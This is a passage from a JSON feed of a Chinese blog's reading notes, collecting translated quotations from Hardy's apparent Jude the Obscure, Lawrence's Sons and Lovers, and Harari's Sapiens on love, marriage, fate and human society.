3-110</h3>\n<p>他凝视时那光辉出现过，现在他寻着黑暗的道路回家，那个地方也像光辉一样存在于他心中。</p>\n<p>那一本本灰尘仆仆的被叫做经典的书籍，包含各种各样的思想：它们尽管被覆盖在如山一般庞大的材料下面，但仍激发着他像老鼠一样，顽强而努力敏捷的将它们一点点搬走。</p>\n<p>他开始怀疑，自己是否为了能够实现一生目标而念该念的书。这种异教文学与真正的文学之间，似乎当然没什么协调一致的地方。</p>\n<p>他好像实实在在的被一只强有力的大手抓住–这种力量，与使他走到今天这一步的那些精神和影响全然不同。它似乎对他的理性和意志并不怎么关心，对他所谓的崇高志向更是毫不理会，而只是拽他走。</p>\n<p>阿拉贝娜似乎还不满意；她总是想象着，等待着，疑惑着。</p>\n<p>而其他一些人，哎呀，血液里就有虚假的本能，一眼看到假造的东西就能很在行地也搞些假冒的事出来。</p>\n<p>在这种情况下，世俗观点占上风，他又能做别的什么呢？</p>\n<p>社会习俗存在着某种问题，它必然使一个人取消若干年的思索和努力才建立起来的完美计划，让他放弃显示自己高于低等动物的唯一机会–原因就在于他被突如其来的本能暂时制服造成了意外后果，而这本能一点说不上品质恶劣，最多只能说软弱而已。</p>\n<p>愈来愈呆滞的眼睛带着一只动物般意味深长的强烈谴责，定住了阿拉贝娜，因为它终于意识到表面看起来使自己唯一的朋友竟然背叛了它。</p>\n<p>我们此时被一个契约拴在一起–坦率的说，它太可恶了。使我们两个都备受折磨，这也许糟透了，但确是事实。</p>\n<p>他们的生活给毁了，他想；毁就毁在他们根本性的婚姻错误；把永久的婚姻建立在一时的感情上，而这感情与相互吸引并无必然联系。</p>\n<p>婚姻好像从来不适合我们。我们的血液里好像有某种东西，它不愿甘心接受这种观念：受约束强迫去做什么事，而这种事在没受约束时倒很情愿做的。</p>\n<h3 id=\"3-111\"><a class=\"markdownIt-Anchor\" href=\"#3-111\">#</a> 3-111</h3>\n<p>毫无疑问，他的计划无论好坏都要实行到底 — 以免产生令人厌恶的悲观情绪，即使他确已看见了世界的丑陋。</p>\n<p>除了自己的灵魂，他无任何指路之星。</p>\n<p>在我们这个世纪里人们如此激烈地追求知识，而她却没有受到任何摧残。她以无法形容的魅力不断呼唤我们追求真正的共同目标。</p>\n<p>人们之所以对自然神学的真实性绝对确信，原因在于那些可能性事物同时发生并汇聚在一起…… 这些可能性事物不会达到合乎逻辑的必然性，却可能产生合乎精神的确实性。</p>\n<p>它们在漫长的岁月里，日晒雨淋，还时而遭到人类的侵害，在这种殊死的搏斗中，他们遍体鳞伤、处处断裂，层层脱落。</p>\n<p>在这个石场中心付出的努力，并不比在那些最崇高的学院里从事学术研究逊色，虽然他们享有如此殊荣。</p>\n<p>他的愿望把他深深的吸引住了，他也就再没心思考虑这个愿望是否可行的问题。</p>\n<p>他正从自己飘忽不定、不拘礼节、出乎寻常的行为举止中，获得一种无与伦比的欢乐。</p>\n<p>如果她也像城里人那样轻浮，那她迟早也会把你也给毁了的。</p>\n<p>与其执行计划而漫无目的的瞎闯，不清楚自己想要做什么，还不如什么计划也不执行……</p>\n<p>他正沉思着，过去那些也像他这样站在路口苦苦挣扎的人们，现在已被所有人忘记了。这个十字路的历史，比城市最古老的学院历史还悠久。</p>\n<p>他担心自己的整个计划已变的腐朽堕落，即便最初不是这个样子，他浮躁不安，只想着社会上往上爬，而在天性方面并无任何高尚的基础 — 他的那种野心纯粹是文明社会里人为的产物。</p>\n<h3 id=\"3-112\"><a class=\"markdownIt-Anchor\" href=\"#3-112\">#</a> 3-112</h3>\n<p>从那个茫然无知的傀儡身上，扯下你想象中给他穿上的衣裳。</p>\n<p>那个地方的人都是愚昧无知的，只有那些市民、手艺人、酒鬼和乞丐除外。他们当然看到了生活的真面目，但学院里的人没有几个能这样。</p>\n<p>即便是苛刻的问题都必须提出来，为的是消除那些错误设想和流言蜚语。</p>\n<p>他们的人生观，只承认建立在兽欲的关系。而人所具有的深厚情爱的范围非常宽广，在这里面兽欲只处于从属地位，那深厚的情爱却被他们忽略了。</p>\n<p>自己已经做了一件这样的错事，却还在帮助、支持所爱的女人去做同样的错事。</p>\n<p>大自然就是存心不让子女只继承父亲或母亲的特性。某个存在物的每一个所期望得到的新生体，都因为只是合金的一半而降低了品质。</p>\n<p>我过去时什么样子，现在还是什么样子。</p>\n<p>他这颗心本来是为信仰开放的，可是世俗的，不法的情感却狡诈地乘虚而入；对于这种情况，只有文学才能给予他最好的忠告。</p>\n<p>若将婚姻或其他习俗置于美德博爱之前，他只不过是言行不一的伪善者。</p>\n<p>的确，当他们在谈论着一个无关紧要的话题时，比如此刻，他们的感情之间还总是进行着另一番悄无声息的谈话，而这种交流进行的非常完美。</p>\n<p>有些女人喜欢被他人所爱，这种喜爱时无法满足的，因此他们爱起别人来也常常无法满足。最后的情形是，他们会发现不能够把爱持续不断地给予和自己同居一室的人。</p>\n<p>文明硬把我们塞进了社会的模子里，而这些模子与我们实际的样子毫无关系；这正如人们常见的那些星座的形状，与实际星星形状毫无关系一样。</p>\n<p>如果婚姻就只是一种肮脏的契约，建立在实质的利益上，那这种实质的东西伤害人必然是合乎逻辑的。</p>\n<p>在文明社会里遭受这种爱情悲剧是很平常的 — 而是一种人为制造出来的悲剧，遭受此悲剧的便是那些按照自然规律应该分离才能得到安慰的人。</p>\n<h3 id=\"3-113\"><a class=\"markdownIt-Anchor\" href=\"#3-113\">#</a> 3-113</h3>\n<p>我们不幸生活在一个风俗和迷信都很原始的时代；当后代人回过头来看这些风俗和迷信时，他们将会说什么呢。</p>\n<p>在这种人为的制度之下，正常的两性冲动都被变成了恶魔般的家庭陷阱和圈套，使得那些想要前进的人掉进去而无法动弹。</p>\n<p>可是，对于社会习俗我又无法满不在乎、漫不经心。</p>\n<p>我知道对她这样一个愿望作出让步，无论在逻辑上还是宗教信仰上都说不通，与我从小到大社会灌输给我的学说也不协调。我知道的只有一件事：我内心有什么东西在告诉我拒绝她是不对的。</p>\n<p>一份契约，就有可能使一个人卷入日复一日，连续不断的悲剧。</p>\n<p>一个纯真自然的仁慈行为也有可能不符合人为规定的道德。</p>\n<p>他躺在自己孤零零的床上，怀着一个中年人的心境，他终于发觉自己的生活，无论是学问方面还是家庭方面都在走向失败，走向黑暗。</p>\n<p>可是我却观赏不到这一切，因为它不会照在我躺在这的阴暗角落。</p>\n<p>我唯一应做的就是要善始善终，把已开始的事情坚持到底，这是我唯一具有男子气概，崇高尊严、仁慈宽厚的行为。</p>\n<p>当一个婚姻终结的时候它就实实在在的终结了。做我们这种无名的穷人倒有一个优点，就是他们为我们办这类事情总是粗略随便的。</p>\n<p>人们照样不停的结婚，因为他们无法抗拒自然的力量，尽管许多人都非常非常清楚，他们也许是一生的苦恼换来一时的快乐。</p>\n<p>过去式怎么样的还继续怎样，在剩下的这段散步时间里咱们只谈那些草地、流水和明年农夫们的情景好了。</p>\n<p>一个被压制下的恶习会以什么新的形式从我体内爆发出来？</p>\n<p>所有的笑都是因为误解发出的。只要你好好看一下，天底下就没有什么可以让人发笑的事情了。</p>\n<h3 id=\"3-114\"><a class=\"markdownIt-Anchor\" href=\"#3-114\">#</a> 3-114</h3>\n<p>那些体验给了我们以威慑的教训，我们竟完全置之不顾。</p>\n<p>由于意志薄弱而给自己带来了一种名义上的羞辱，为了逃避这种羞辱，她只好让自己堕落下去，给一个她瞧不起的暴君做奴隶，去忍受真正的羞辱 — 而对于那个暴君，她只有永远躲避才能是自己得到拯救的机会。</p>\n<p>其实他们也没什么离奇古怪、异乎寻常的地方：人都是这样的。每个人都在开始产生我们这样的感觉。我们只是走在前头一点儿，此外没别的。</p>\n<p>对于我们来说，强迫性的家庭关系会扼杀我们的热诚与纯真。</p>\n<p>人们如果选择了自己的生活方式，就会被他们每一个人看作是邪恶的。实际上就是这些看法，会把那些心地最好的人也弄得不顾一切，而真正成了不道德的人。</p>\n<p>可即使是一个面包师傅，要想招来顾客，他也必须要符合社会习俗才行。</p>\n<p>胆怯的屈服于传统，这就是他们的特性。</p>\n<p>他自己管理家务，自己煮饭，和自己交心交朋友，因为在这世上孑然一身，凭借着自己所有的本领照顾自己。</p>\n<p>残酷就是贯穿着整个自然和社会的法力，我们想逃也逃不脱它。</p>\n<p>在眼下人人追求上进的时代，成千上万的人在思考着这个问题：是不加鉴别、不予考虑是否恰当，碰到什么就做什么呢？还是考虑自己做什么恰当或什么是自己的志趣，从而对所走的路作出相应的调整？</p>\n<p>大众评价人的尝试不根据其本质上的好坏，而根据他们偶然的结果。</p>\n<p>现在人心和社会都不得安宁，使许许多多的人十分苦恼；而毕竟说来，我也许就是这种精神实质下一个微不足道的牺牲品罢了。</p>\n<p>我处在一片杂乱无章的信条之中，在黑暗里摸索着 — 依照本能而不是依照榜样行事。</p>\n<p>我觉得我们的社会制度存在着某些弊病：这些弊病只有比我更具有远见卓识的男女才能发现 – 假如他们在我们这个时代能发现的话。</p>\n<h3 id=\"3-115\"><a class=\"markdownIt-Anchor\" href=\"#3-115\">#</a> 3-115</h3>\n<p>他们似乎过早的看到了生活所有的恐惧，而又缺乏坚忍不拔的力量抵抗那些恐惧。将来人们会普遍不愿再世为人，而自杀就是这种愿望的开端。</p>\n<p>大自然赋予了我们什么样的本能，我们就要尽这些本能去寻找快乐；尽管这些本能受到社会文明的阻挠 — 那正是大自然的意图，大自然的规律和存在的理由。我们真的傻，对大自然的话信以为真。</p>\n<p>世界就像是梦中作的一首诗或一支曲子，人在朦朦胧胧时它似乎美妙绝伦，而在完全清醒时它则显得毫无希望，荒谬可笑。</p>\n<p>在我们这样一个古老的文明里，过度放纵自己天生的、不受约束的正义感和公平感，必然是要受到惩罚的。假如你希望享有一般人的舒适和荣誉，你就必须得照后天学来的、培养而成的正义感和公平感行事，而不要去理睬天然的爱心。</p>\n<p>请记住，人类中最优秀最伟大的人，是那些在世间一无所成的人。每一个成功者或多或少都怀有私心。</p>\n<p>她深受惩罚，愤世嫉俗，满怀悔恨，紧张的神经也使她的肉体深受其害：她的形体看起来比过去更瘦小了。</p>\n<p>要不然你就是在欺骗自己，正如很多女人在这件事上那样，并不真正你所装作的事，而只是一味满足于一种虚假信念而聊以自慰，引以为豪。</p>\n<p>到现在她仍然没有完全屈服于身上的枷锁，仍然怀着人类之爱的最后一点本能。</p>\n<p>所有的这些都不再使我感兴趣。一切都被这严峻的现实磨的粉碎了！</p>\n<p>我既不在人中间又不在鬼中间生活。</p>\n<p>那时我们头脑清晰，无所畏惧的热爱真理 — 但时代对于我们又尚未成熟！我们的思想超前了 50 年，这于我们毫无益处。</p>\n",
            "tags": [
                "命运",
                "爱情",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/38%E3%80%8A%E5%84%BF%E5%AD%90%E4%B8%8E%E6%83%85%E4%BA%BA%E3%80%8B%E5%8A%B3%E4%BC%A6%E6%96%AF/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/38%E3%80%8A%E5%84%BF%E5%AD%90%E4%B8%8E%E6%83%85%E4%BA%BA%E3%80%8B%E5%8A%B3%E4%BC%A6%E6%96%AF/",
            "title": "《儿子与情人》劳伦斯",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>这会儿，在他眼里，他们只不过是一些动物罢了。</p>\n<h3 id=\"3-116\"><a class=\"markdownIt-Anchor\" href=\"#3-116\">#</a> 3-116</h3>\n<p>正是这种不断的探求，不断的对生命真谛的追问，才使得本无意义的人生变得绚烂多彩。</p>\n<p>想出去，可就是迈不开脚，但又不愿呆在屋里。天很热，憋得她透不过气。想想未来，她的生活前景使她觉得仿佛被活埋在了那里。</p>\n<p>生活常常摆布人，支配其肉身，填满其历程，但并不真实，任其为之仿佛生活是可有可无的。</p>\n<p>他会怎么着或者不会怎么着，她心里都一清二楚。</p>\n<p>很快就习惯了，像老鼠一样过日子，在夜里才出来看看。</p>\n<p>各自把一切皆忘，只想想憎恨对方就可以了。继续这场争吵。</p>\n<p>有些话，有些瞬间，想起来就像灼热的火印烙在她的心上；每当她让过去一小时的那一幕再现眼前一遍，那火印便是在原处烙一下，直到印记烙牢，痛苦烙尽，最终清醒过来。</p>\n<p>她憎恶她丈夫，只要有听众，他就会装模作样、嘀嘀咕咕的博取别人的同情。</p>\n<p>她对他的爱情是逐步减退的，但总也处在衰退之中。</p>\n<p>但是他们的心老悬着，眼神阴郁他们的全部生活从中一览无遗。</p>\n<p>整个屋子里弥漫着等待的气氛，所等的那个人正满身矿灰，没吃晚饭，隔着茫茫夜色在离家一里之外一醉方休。</p>\n<p>被拦在生活之外，不受欢迎。但冰冻三尺，非一日之寒，无法改变了。</p>\n<p>他好比一台平稳、愉快的运转着的家庭机器里出现的障碍。他一向都能觉察到。可如今，事情已经无法挽回了。</p>\n<p>既没礼貌，又没头脑 — 他们的狡诈是从娘胎里带来的。</p>\n<p>家到底是家，不管受了多少苦，他们还是满怀激情的爱着它。</p>\n<p>这个令这个穷小子对迷人的南方产生无限遐想的地方，也拉不走他。</p>\n<h3 id=\"3-117\"><a class=\"markdownIt-Anchor\" href=\"#3-117\">#</a> 3-117</h3>\n<p>在她的内心深处，在本应燃烧着爱情之火的地方、却仍是一片空白。</p>\n<p>然而他自视甚高，总是以己度人，毫不留情的将别人估量分等。</p>\n<p>他被生活的变化弄得心神不宁，不但没有站稳脚跟。反而似乎转入生活的激流中晕头转向了。</p>\n<p>你在随大流这么干的时候觉得很安全，也能满足你的虚荣心。可你要当心，当你独自一个情场得胜的时候，你再看看自己的感受吧。</p>\n<p>他似感到商业社会有它特定的价值规律，不近人情，他真害怕这些。</p>\n<p>可怜的范尼有一种变态的敏感，老是臆想别人在侮辱他。</p>\n<p>这会儿，在他眼里，他们只不过是一些动物罢了。</p>\n<p>她和我们不一样。那些人，她生活圈子里的那些人，他们的生活准则似乎和我们不同。</p>\n<p>她除了谈情说爱，聊天闲扯，别的什么也不懂。</p>\n<p>以往在同丈夫一起生活的岁月里，她的内心世界似乎垮了下来，但这并没有摧毁他活下去的力量。现在她的心灵受了伤，遭受打击的是他的希望。</p>\n<p>他心里没有神圣的理想，他只想尽可能过上舒服的日子，只想在他要吃饭时有饭吃。</p>\n<p>米莉亚姆似乎生活在一个梦幻般的故事里，好像一个被奴役的少女，她的灵魂在另一个遥远、神秘的地方，沉醉在梦境之中。</p>\n<p>他们不屑于与一个外人建立普通的人类感情和寻常的友谊；他们总是不满足，想要追求一些更深层次的东西。在他们看来，普通人似乎太浅薄、平凡、无足轻重。因此他们连最简单的社交都不习惯，笨拙地令人痛苦，简直活受罪，却又自认为高人一等，傲慢无礼。</p>\n<h3 id=\"3-118\"><a class=\"markdownIt-Anchor\" href=\"#3-118\">#</a> 3-118</h3>\n<p>然而私底下他们也渴望精神上的亲密，这种亲密是他们得不到的，因为他们沉默寡言，对别人一概愚蠢的表示蔑视，于是堵死了每一条通向密切关系的途径。他们要的是真正的亲密，可是他们却连正常地接近别人做不到，因为他们不屑走出第一步，他们瞧不起那些构成人与人普通交往的琐碎小事。</p>\n<p>她那强烈的宗教感情，使她隔绝了凡俗生活，使得世界在她眼里要么是一个没有罪恶，没有性关系的修道院或者极乐天堂，要么就是个丑陋，残酷的东西。</p>\n<p>她脸上的表情难得有什么变化，总是一副沉思的样子。她没有轻松自在的时候，她把一切都抓得死紧，她过分的努力往往起了反作用。</p>\n<p>他只有在受到外界刺激时才能清醒的思考。</p>\n<p>如今他已步入社会，大可以独立了。她坚持那种世俗的价值观，看外表，看举止，看地位，这些是米莉亚姆不屑一顾的。</p>\n<p>米莉亚姆自己没有朋友，不过她并不怎么苦恼，因为她瞧不起其他人的浅薄。</p>\n<p>他发疯似得想要去做某件事，可是他不敢 — 或者说不能。有什么东西阻挠着他。他做这件事是不道德的。</p>\n<p>他是天性对一切持批判态度，不大动情感的人。他用他锋利如刀的智慧审视她的信仰，而这信仰是她生活、行动乃至生命的依托。</p>\n<p>她所看到的前景是不幸，是悲伤，是牺牲。能够作出牺牲，她感到骄傲，能够自我克制，说明她坚强，因为她不相信自己是庸碌之辈。她对那些巨大的，深沉的，诸如灾难之类的事，是做好了准备的。</p>\n<p>我只能给你友谊–我能做到的就只有这一点–这是我性格上的缺陷，事情偏到一边去了–我恨这种摇摆不定。</p>\n<p>这种自我怀疑是她灵魂中最深刻的主题。它埋葬得如此之深，她既不敢认识，也不敢承认。也许她是有所欠缺。这就像一种微妙的、无休止的羞耻感，使得她总畏缩不前。</p>\n<h3 id=\"3-119\"><a class=\"markdownIt-Anchor\" href=\"#3-119\">#</a> 3-119</h3>\n<p>她看不起他家人的那股子俗气。他们不懂得什么是真正有价值的。</p>\n<p>她相信他心里既有对高尚事物的欲望，又有对低俗事物的欲望，而对高尚事物的欲望将占上风。但是，有一点她忽略了，她自己所谓的 “高尚” 和 “低俗” 是很武断的。</p>\n<p>你会发现，你老是被你已抛之脑后的东西绊倒。</p>\n<p>它那永恒的宁静中有某种东西，某种宿命的东西，反映在了她的身上。凡事都是命中注定的，该怎样就怎样。即便他穷尽年轻生命的全部意志力也无法改变。他用他灵魂的全部力量抗衡着命运。</p>\n<p>他有一种蔑视一切的作风 — 一种愤世嫉俗的作风。</p>\n<p>她的一举一动完全是按照自己的意愿。她想做什么就做什么了，不要任何人承担责任。她正以别人所不理解的方式追求自己的幸福。</p>\n<p>他完全可能背叛自己，背叛那个真正的、深沉的保罗・莫莱尔。他有变轻浮的危险，像亚瑟那种人，像他父亲那样追求个人欲望的满足。他为了跟克拉拉进行轻薄无聊的交往，竟会舍弃自己的灵魂。</p>\n<p>上帝不了解事物，它本身就是事物。我敢说他没有感情。</p>\n<p>然而我们还是凡人，要形影不离的生活会很痛苦，因为不知怎么地，和你在一起，我就平凡不了，而你知道，经常超脱凡人的境界就会失掉凡人的生活。</p>\n<p>人应该在内心感知是非，应该有耐心逐渐认识自己的上帝。</p>\n<p>从我自身来说是这样，从我所属的阶级，受到的教育或举止来说并非如此，那样的话，我只是一个平民百姓。可从我自身来说，我是个绅士。</p>\n<p>人与人之间的差别不在于阶级，而在于自身。一个人从中产阶级那里只获得思想，而从平民百姓那里得到的是 — 生活本身，生活的热情，你感受到他们的爱和恨。</p>\n<h3 id=\"3-120\"><a class=\"markdownIt-Anchor\" href=\"#3-120\">#</a> 3-120</h3>\n<p>那是女人的整个人生教义 — 心灵的安逸和肉体的舒适。我真瞧不起这一套。</p>\n<p>只要生活充实，幸不幸福没什么关系，恐怕你所谓的幸福会让我厌烦。</p>\n<p>斗争–斗争–受折磨。这就是你做的一切，我所能看到的。</p>\n<p>只要你不觉得生活时间微不足道而又痛苦的营生，其他的就无关紧要了，幸福也罢，不幸福也罢。</p>\n<p>他对自己，对自己受的苦，对自己的生活都是那样令人心碎的满不在乎。</p>\n<p>她遭到拒绝和被剥夺的东西太多了。她那本不该沦为机械的手臂正机械地动着，那本不该底下的头垂伏在花边上了。她纺着线，仿佛是在被生活抛弃的垃圾堆上，流落彷徨。</p>\n<p>我向来不大有机会挑三拣四，也就没法去浪费时间考虑这个。</p>\n<p>你总给人一种印象，在等待什么。我看你不论做什么，都心不在焉的，你在等着什么？</p>\n<p>他锁着眉头，忧郁的凝眸着远处脚下的大地，陷入了沉思。万物细致、有趣的千姿百态从景致中消失了；剩下的只是一大片黑暗的哀伤和不幸的发源地，所有的房屋、河滩，所有的人类，飞鸟都是一样；不同的只是他们的外形。既然万物的形状都已消失，留下来构成大地景致的就只是一堆黑暗地充满着挣扎和痛苦的物质。</p>\n<p>在他看来，在一场他不想要的婚姻中牺牲自己等于堕落，会毁了他的一生，使生命成为虚无。</p>\n<p>我们的灵魂中的某种邪恶，使得我们想要的东西不去要，却拼命想躲开。</p>\n<p>他没有一刻的轻松，从未放纵他那强烈的饥渴和本能的情欲，他必须记得自己是一个审慎、做事三思而行的人。</p>\n<p>他觉得似乎一切都无所谓了，仿佛他的生命已被抹去，进入另一个离这不远的可爱世界。这种奇异的，伸手从容触摸死亡的感觉对他来说是新鲜的。</p>\n<h3 id=\"3-121\"><a class=\"markdownIt-Anchor\" href=\"#3-121\">#</a> 3-121</h3>\n<p>对他来说，生命像一个影子，白天是白色的影子；黑夜、死亡，平静，还有呆滞，似乎才是生命的真实所在。人生在世，终日奔忙，孜孜以求 — 那才是虚无缥缈。生命的最高境界就融入黑暗之中，飘然而去。</p>\n<p>摆脱我们的个性，我们的意志，我们的努力 — 不需努力的活着，神志清醒的睡着–我想那是十分美好的；那就是我们的来世 — 我们的永生。</p>\n<p>他们之间原本就没有什么真感情，一直以来他想象着的东西根本就不存在。</p>\n<p>在他以为她是崇拜他的时候，她却是蔑视他。她由他胡说八道，却不予反驳。她让他孤身奋斗。</p>\n<p>假如本来就没多少爱情的话，也就没必要为它的结束大惊小怪了。</p>\n<p>他的快乐似乎不是真实的。这背后藏着太多恐惧和痛苦。</p>\n<p>就这样，他离开了她。丢下她一个人。很少有人关心她，她关心的人也很少。她仍是独自一人，等待着。</p>\n<p>他既不思想也不睡觉，就只是一动不动地坐着，凝视着。</p>\n<p>他乐意跟他谈自己，就像是个头脑最简单的自我主义者。</p>\n<p>跟着他，他只有一半是活着的；另一半在休眠，失去了感觉。</p>\n<p>这很难说，反正是当你真正和另一个人结合在一起的时候，那种改变你的巨大的、强烈的东西。它简直像能滋润你的心灵，使你得以继续生活、成熟。</p>\n<p>他母亲身上有着某种不容质疑的、非常确信的东西，好像她一生中从未遇到过可担忧的事似得。</p>\n<p>只是说说话而已。我们之间除了说话，从来没有更多的东西。</p>\n<p>肉体上的疼痛使他咬紧了嘴唇，直到咬出了血，内心的混沌令他无法思考，甚至失去了感觉。</p>\n<p>他们穷的要命，生活节奏慢得要死。所以他们就渴望战争。他们把打仗看作是生活下去的机会。没有打仗，他们个个游手好闲，百无聊赖。</p>\n<h3 id=\"3-122\"><a class=\"markdownIt-Anchor\" href=\"#3-122\">#</a> 3-122</h3>\n<p>生活就像一个圆圈，总在原地打转，一步也迈不出去。</p>\n<p>他爱她时那种赤裸裸的饥渴和无法回避的情欲，某种强烈，盲目和凶狠的原始野性的爱，使她觉得这一刻对她来说几乎是可怕的。</p>\n<p>没有什么东西可以否定他，没有什么东西可以把他夺走，他几乎成了他们的生命信仰。</p>\n<p>她已经在那儿了，可她却抓不住 — 某样东西 — 她自己也不知道是什么 — 她疯狂的想要拥有的东西。</p>\n<p>爱情应当给人一种自由感，而不是被监禁的感觉，米莉亚姆让我觉得自己像栓在桩上的驴。我必须在她的地盘上进食，别处就不行。</p>\n<p>我觉得，好像我并没有得到你，好像你整个人都不在那儿，好像你占有的并不是我。而是专供你自己享有的什么东西。</p>\n<p>情感强烈得足以带走一切 – 理智、灵魂、热血 — 统统席卷而去。那些微不足道的责难，那些无关痛痒的感觉，渐渐的都烟消云散了，思想也随之而去，一切都在一股洪流中滚滚向前。它成了一个没有理智，只有强大本能的男人。</p>\n<p>他感觉自己的生活好像失去了平衡，似乎就要崩溃了。</p>\n<p>他又埋头机械的做自己的事情，创作出不错的东西来，却不知道自己在做什么。一切都显得那么不真实，他无法理解。</p>\n<p>他感觉自己的生命似乎正在体内一点点地毁灭，他常常工作不下去，笔停不下来写了。他瞪眼坐着，无知无觉的。等到又清醒过来，他觉得恶心，四肢发颤。他只是闭着眼，逆来顺受；听凭这事从他身上压过。</p>\n<p>即便他就这样永远走下去，也只能走到那个地方去。</p>\n<p>日子一星期一星期地在似真非真的过去，没有多少痛苦，也没有多少意思，也许还有点儿轻松，多半是一个白夜。</p>\n<p>我仿佛在一个七缠八绕的洞里又黑又闷，到处都无路可走。</p>\n<h3 id=\"3-123\"><a class=\"markdownIt-Anchor\" href=\"#3-123\">#</a> 3-123</h3>\n<p>他似乎越来越脱离人世间了。这样做使他感到一种恶作剧般的快感。</p>\n<p>他仿佛试图龟缩在一个小的不能再小的罗盘里。他走来走去张罗着什么的时候，他坐在那儿谈话的时候，总让人感觉有点虚伪，显得格格不入。</p>\n<p>他开始放弃对次要事物的追求，生怕有件不同小可的事发生，就是尾随他所爱的人，朝黄泉路跌落。</p>\n<p>他自己对生活把握不定，因着没有人支持他，他暗自羞愧，感觉自己像影子一样虚无缥缈，仿佛自己在这个具体有形的世界中那么微不足道，便把自己缩成了一团，越缩越小。</p>\n<p>道斯原本已经被驱赶到了生命的尽头，直到他害怕了起来。它能够走在死亡的边缘，能够躺在那边上朝里张望。后来，他胆怯了，害怕了，只得往回爬，像乞丐一样接受施舍。</p>\n<p>他的眼神阴郁、紧张，像在搜寻什么。一切仿佛变了样，如此虚幻。人们似乎没有理由在街上行走，房屋似乎没有理由在大白天堆叠在那里。这些东西似乎没有理由占据着空间，不让它空着。</p>\n<p>当他独自一人，或是在厂里勤奋而机械地工作时，他才像是他自己。工作的时候他真正忘记了一切，那时他就没有意识了。可这总有完的时候。万物都失去了其真实性，他的心被深深刺痛了。</p>\n<p>他纹丝不动。他不想动。他什么都没想。这样就轻松些。没有那种想要了解什么的痛苦。然而，另一种意识在机械地活动着，不时闪现成一连串尖锐的语句。</p>\n<p>老是孤零零的一个人，他的心灵在摇摆，先是想死，然后又顽强的要活。</p>\n<p>真正的痛苦在于，他无处可去，无事可干，无话可讲，自己也成了虚无。有时他疯了似的在大街小巷上奔跑；有时他是疯了；事物又像在那儿，又不像在那儿，折腾的他心悸气喘。周围的一切都往后退去，离他远远的。</p>\n<p>他和他们之间隔着什么。他触不到。他不需要他们，他不需要酒。可他既不属于这街道，也未置身其中。有什么东西把他隔离了出来。大街上，路灯下，一切都在进行，却对他关闭着。他够不着他们。</p>\n<p>他能去哪儿？他无处可去，既不能折回小酒店里去，也不能到前方什么地方去。他感到窒息。这世界没有他的容身之地。他内心的压力越来越大，他觉得自己要崩溃了。</p>\n<p>她以她那种盲目的方式，漫无目的的走着，穿过教堂外面那一小群人。她在人群中总显得那么茫然不知所措，不得其所。</p>\n<p>面对着他体内某种未知的强烈要求，她的软弱无力使她陷入了绝境。</p>\n<p>他知道，留下来和她厮守，把绝望而不顾一切的灵魂压制住，便是摒弃了他自己的生命。他不希望放弃自己的生命奉献给她。</p>\n<p>他没有信仰，他关心的只是一时的诱惑，其他的他都不关心，也不关心更为深刻的东西。</p>\n<p>他没有容身之地！他不管站在什么地方，都是形单影只。无尽的空间从他胸膛中，从他嘴里涌出来，漫步在他身后，无处不在。他发现自己置身于一片空虚地带，沿街匆匆而过的行人也没有在这里加上什么障碍。</p>\n<p>他不愿就此屈服，他不会走那条路，不会跟随她走向黑暗。</p>\n<hr>\n",
            "tags": [
                "爱情",
                "道德"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/26%E3%80%8A%E4%BA%BA%E7%B1%BB%E7%AE%80%E5%8F%B2%E3%80%8B%E5%B0%A4%E7%93%A6%E5%B0%94%C2%B7%E8%B5%AB%E6%8B%89%E5%88%A9/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/26%E3%80%8A%E4%BA%BA%E7%B1%BB%E7%AE%80%E5%8F%B2%E3%80%8B%E5%B0%A4%E7%93%A6%E5%B0%94%C2%B7%E8%B5%AB%E6%8B%89%E5%88%A9/",
            "title": "《人类简史》尤瓦尔·赫拉利",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>个体诞生的背后就只是盲目的演化过程，而没有任何目的。</p>\n<h3 id=\"3-48\"><a class=\"markdownIt-Anchor\" href=\"#3-48\">#</a> 3-48</h3>\n<p>庞大的大脑也是个庞大的负担。大脑结构脆弱，原本就不利于活动，更别说还得用个巨大的头骨把它装着。而且大脑消耗的能量惊人。</p>\n<p>政府把国防预算转拨给了教育，人类也把手臂二头肌所需要的能量拨给了大脑里的神经元。</p>\n<p>由于人类出生的时候尚未发育完全，比起其他动物，也就更能够用教育和社会化的方式加以改变。大多数哺乳动物脱离子宫的时候，就像是已经上了采油的陶器出了窑，如果还想做什么调整，不是刮伤就是碎裂。</p>\n<p>毕竟现实的生物界限，并不是非黑即白，而有重要的灰色地带。</p>\n<p>宽容可不是智人的特色，即使到了现代，不过是因为肤色、方言、宗教等等微小的差异，就足以使智人彼此大动干戈、非要把对方赶尽杀绝。</p>\n<p>智人主要是一种社会性的动物，社会合作是我们得以生存和繁衍的关键。</p>\n<p>即使到了今天，绝大多数的人际沟通讲的都还是八卦。这对我们来说真是再自然不过，就好像我们的语言天赋就是为了这个目的而生的。</p>\n<p>人类语言真正独特的功能，是能够传达一些根本不存在的事物的信息。据我们所知，只有智人能够表达关于从来没有看过、碰过、耳闻过的事物，而且讲的煞有其事。</p>\n<p>“虚构” 这件事的重点不只在于让人类能够拥有想象，更重要的是可以” 一起 “想象，编织出种种共同的虚拟故事，甚至连现代所谓的国家也是一种想象。这样的虚构故事赋予智人前所未有的能力，让我们的一大批集结人力、灵活合作。</p>\n<p>人类的社会本能和黑猩猩没什么不同，只适应于比较亲近的小团体，等到这个团体过大，社交秩序就会崩坏，使团体分裂。</p>\n<p>就算是大批互不相识的人，只要同样相信某件事，就能共同合作。</p>\n<h3 id=\"3-49\"><a class=\"markdownIt-Anchor\" href=\"#3-49\">#</a> 3-49</h3>\n<p>除了存在于人类的共同想象之外，这个宇宙根本就没有神，没有国家，没有钱、人权、法律、正义等。</p>\n<p>说穿了，就是讲故事，再说服听众相信这些故事。</p>\n<p>要说出有效的故事，其实并不容易，难的点不在于讲故事，而在于让人相信。</p>\n<p>通过故事创造的东西，用学术术语来说就称为 “小说”，“社会建构” 或者 